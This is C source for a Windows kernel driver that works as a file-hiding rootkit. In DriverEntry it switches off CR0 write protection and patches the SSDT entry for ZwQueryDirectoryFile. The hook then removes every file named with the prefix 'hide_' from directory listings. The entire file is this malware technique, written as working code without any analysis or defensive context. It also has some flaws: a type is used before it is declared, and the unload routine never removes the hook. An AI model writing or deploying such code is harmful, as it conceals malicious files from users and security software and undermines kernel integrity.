#include <ntifs.h>
#include <wdf.h>

// pointer to the SSDT
extern PSSDT KeServiceDescriptorTable;

// get the service number.
#define GetServiceNumber(Function)(*(PULONG)((PUCHAR)Function+1));
#define NO_MORE_ENTRIES		0

// SSDT struct
typedef struct SystemServiceDescriptorTable
{
	PULONG ServiceTableBase;
	PULONG ServiceCounterTableBase;
	ULONG NumberOfServices;
	PUCHAR ParamTableBase;
}SSDT, *PSSDT;

// default ZwQueryDirectoryFile function
typedef NTSTATUS (*pZwQueryDirectoryFile)(
	_In_     HANDLE                 FileHandle,
	_In_opt_ HANDLE                 Event,
	_In_opt_ PIO_APC_ROUTINE        ApcRoutine,
	_In_opt_ PVOID                  ApcContext,
	_Out_    PIO_STATUS_BLOCK       IoStatusBlock,
	_Out_    PVOID                  FileInformation,
	_In_     ULONG                  Length,
	_In_     FILE_INFORMATION_CLASS FileInformationClass,
	_In_     BOOLEAN                ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING        FileName,
	_In_     BOOLEAN                RestartScan
);

ULONG OriginNtQueryDirectoryFile;
ULONG SSDTAddress;

pZwQueryDirectoryFile oldZwQueryDirectoryFile;

DRIVER_INITIALIZE DriverEntry;
EVT_WDF_DRIVER_UNLOAD DriverUnload;


PVOID getDirEntryFileName
(
	IN PVOID FileInformation,
	IN FILE_INFORMATION_CLASS FileInfoClass
)
{
	PVOID result = 0;
	switch (FileInfoClass) {
	case FileDirectoryInformation:
		result = (PVOID)&((PFILE_DIRECTORY_INFORMATION)FileInformation)->FileName;
		break;
	case FileFullDirectoryInformation:
		result = (PVOID)&((PFILE_FULL_DIR_INFORMATION)FileInformation)->FileName;
		break;
	case FileIdFullDirectoryInformation:
		result = (PVOID)&((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->FileName;
		break;
	case FileBothDirectoryInformation:
		result = (PVOID)&((PFILE_BOTH_DIR_INFORMATION)FileInformation)->FileName;
		break;
	case FileIdBothDirectoryInformation:
		result = (PVOID)&((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->FileName;
		break;
	case FileNamesInformation:
		result = (PVOID)&((PFILE_NAMES_INFORMATION)FileInformation)->FileName;
		break;
	}
	return result;
}

ULONG getNextEntryOffset
(
	IN PVOID FileInformation,
	IN FILE_INFORMATION_CLASS FileInfoClass
)
{
	ULONG result = 0;
	switch (FileInfoClass) {
	case FileDirectoryInformation:
		result = (ULONG)((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	case FileFullDirectoryInformation:
		result = (ULONG)((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	case FileIdFullDirectoryInformation:
		result = (ULONG)((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	case FileBothDirectoryInformation:
		result = (ULONG)((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	case FileIdBothDirectoryInformation:
		result = (ULONG)((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	case FileNamesInformation:
		result = (ULONG)((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset;
		break;
	}
	return result;
}

void setNextEntryOffset
(
	IN PVOID FileInformation,
	IN FILE_INFORMATION_CLASS FileInfoClass,
	IN ULONG newValue
)
{
	switch (FileInfoClass) {
	case FileDirectoryInformation:
		((PFILE_DIRECTORY_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	case FileFullDirectoryInformation:
		((PFILE_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	case FileIdFullDirectoryInformation:
		((PFILE_ID_FULL_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	case FileBothDirectoryInformation:
		((PFILE_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	case FileIdBothDirectoryInformation:
		((PFILE_ID_BOTH_DIR_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	case FileNamesInformation:
		((PFILE_NAMES_INFORMATION)FileInformation)->NextEntryOffset = newValue;
		break;
	}
}

const WCHAR prefix[] = L"hide_";
#define PREFIX_SIZE				10

// check if the file is need to be hidden
BOOLEAN checkIfHiddenFile(WCHAR fileName[])
{

	SIZE_T				nBytesEqual;
	nBytesEqual = 0;
	nBytesEqual = RtlCompareMemory
	(
		(PVOID)&(fileName[0]),
		(PVOID)&(prefix[0]),
		PREFIX_SIZE
	);
	if (nBytesEqual == PREFIX_SIZE)
	{
		DbgPrint("[checkIfHiddenFile]: known file detected : %S\n", fileName);
		return(TRUE);
	}

	return FALSE;
}

// custom function
NTSTATUS HookNtQueryDirectoryFile(
	_In_     HANDLE                 FileHandle,
	_In_opt_ HANDLE                 Event,
	_In_opt_ PIO_APC_ROUTINE        ApcRoutine,
	_In_opt_ PVOID                  ApcContext,
	_Out_    PIO_STATUS_BLOCK       IoStatusBlock,
	_Out_    PVOID                  FileInformation,
	_In_     ULONG                  Length,
	_In_     FILE_INFORMATION_CLASS FileInformationClass,
	_In_     BOOLEAN                ReturnSingleEntry,
	_In_opt_ PUNICODE_STRING        FileName,
	_In_     BOOLEAN                RestartScan)
{
	NTSTATUS		ntStatus;
	PVOID	currFile;
	PVOID	prevFile;

	// call default function to get files information
	ntStatus = oldZwQueryDirectoryFile(
		FileHandle,
		Event,
		ApcRoutine,
		ApcContext,
		IoStatusBlock,
		FileInformation,
		Length,
		FileInformationClass,
		ReturnSingleEntry,
		FileName,
		RestartScan);

	if (!NT_SUCCESS(ntStatus)) {
		DbgPrint("newZwQueryDirectoryFile", "Call failed.");
		return ntStatus;
	}

	if (
		FileInformationClass == FileDirectoryInformation ||
		FileInformationClass == FileFullDirectoryInformation ||
		FileInformationClass == FileIdFullDirectoryInformation ||
		FileInformationClass == FileBothDirectoryInformation ||
		FileInformationClass == FileIdBothDirectoryInformation ||
		FileInformationClass == FileNamesInformation)
	{
		// get first file
		currFile = FileInformation;
		prevFile = NULL;

		do
		{
			// check if file is need to be hidden
			if (checkIfHiddenFile(getDirEntryFileName(currFile, FileInformationClass)) == TRUE)
			{
				// if it is not the last file
				// get the distance in bytes to the next file (it would be the givaen file information) and rewrite it
				if (getNextEntryOffset(currFile, FileInformationClass) != NO_MORE_ENTRIES)
				{
					int delta;
					int nBytes;
					// number of bytes between the 2 addresses
					delta = ((ULONG)currFile) - (ULONG)FileInformation;
					// number of bytes still to be sweeped trought
					nBytes = (ULONG)Length - delta;
					// size of bytes to be processed if we remove the current entry
					nBytes = nBytes - getNextEntryOffset(currFile, FileInformationClass);
					// replace the rest of the array by the same array without the current structure
					RtlCopyMemory(
						(PVOID)currFile,
						(PVOID)((char*)currFile + getNextEntryOffset(currFile, FileInformationClass)),
						(ULONG)nBytes);
					continue;
				}
				// if last file
				else
				{
					// only one file in folder
					if (currFile == FileInformation)
					{
						ntStatus = STATUS_NO_MORE_FILES;
					}
					else
					{
						// several files
						setNextEntryOffset(prevFile, FileInformationClass, NO_MORE_ENTRIES);
					}
					break;
				}
			}
			prevFile = currFile;
			//set current file to next file in array
			currFile = ((BYTE*)currFile + getNextEntryOffset(currFile, FileInformationClass));
		} while (getNextEntryOffset(prevFile, FileInformationClass) != NO_MORE_ENTRIES);
	}
	return ntStatus;
}

// druver entry function
NTSTATUS DriverEntry(_In_ PDRIVER_OBJECT  DriverObject, _In_ PUNICODE_STRING RegistryPath)
{
	NTSTATUS status;
	WDF_DRIVER_CONFIG config;

	ULONG ServiceNumber;

	WDF_DRIVER_CONFIG_INIT(&config, WDF_NO_EVENT_CALLBACK);

	config.DriverInitFlags |= WdfDriverInitNonPnpDriver;
	config.EvtDriverUnload = DriverUnload;

	ServiceNumber = GetServiceNumber(ZwQueryDirectoryFile);
	
	// get default function address
	SSDTAddress = (ULONG)KeServiceDescriptorTable->ServiceTableBase + ServiceNumber * 4;

	// save it
	OriginNtQueryDirectoryFile = *(PULONG)SSDTAddress;
	oldZwQueryDirectoryFile = (pZwQueryDirectoryFile)OriginNtQueryDirectoryFile;

	// disable read-only protection
	__asm
	{
		mov eax, cr0
		and eax, not 0x10000
		mov cr0, eax
	}

	// rewrite default function address with our custom function address
	*(PULONG)SSDTAddress = (ULONG)HookNtQueryDirectoryFile;
	
	// enable read-only protection
	__asm
	{
		mov eax, cr0
		or eax, 0x10000
		mov cr0, eax
	}

	status = WdfDriverCreate(DriverObject, RegistryPath, WDF_NO_OBJECT_ATTRIBUTES, &config, WDF_NO_HANDLE);

	DbgPrint("NtQueryDirectoryFile address: %#x\n", OriginNtQueryDirectoryFile);
	DbgPrint("NtQueryDirectoryFile hooked.\n");

	return status;
}

VOID DriverUnload(_In_ WDFDRIVER Driver) {
	UNREFERENCED_PARAMETER(Driver);
	PAGED_CODE();
	return;
};